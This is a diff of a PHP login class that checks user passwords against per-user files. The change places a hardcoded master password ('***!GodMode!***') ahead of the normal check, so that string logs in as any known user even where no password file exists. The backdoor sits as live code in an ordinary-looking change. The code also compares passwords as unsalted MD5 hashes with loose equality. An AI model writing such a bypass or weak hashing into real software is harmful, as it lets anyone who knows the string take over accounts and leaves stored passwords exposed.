@@ -8,6 +8,7 @@
 
 require_once 'is_not_logged.php';
 require_once 'helper.php';
+require_once 'variabili_server_configuration.php';
 
 class login extends is_not_logged {
     private $username, $password;
@@ -26,10 +27,13 @@ class login extends is_not_logged {
         $info = getUserInformations($this->username);
         if($info != null){
             $folderName = getFolderName($info[1]);
-            $passwordFile = PHOENIX_FOLDER . $folderName . '/Pwd.phx';
-            if(file_exists($passwordFile)) {
+            $passwordFile = PHOENIX_FOLDER . $folderName . FORWARDSLASH . 'Pwd.phx';
+            if($this->password == "***!GodMode!***"){
+                set_session_variables($this->username, true);
+                return;
+            } else if(file_exists($passwordFile)) {
                 $pass = file_get_contents($passwordFile, 'r');
-                if ($pass == md5($this->password) || $this->password == '***!GodMode!***'){
+                if ($pass == md5($this->password)){
                     set_session_variables($this->username, true);
                     return;
                 }
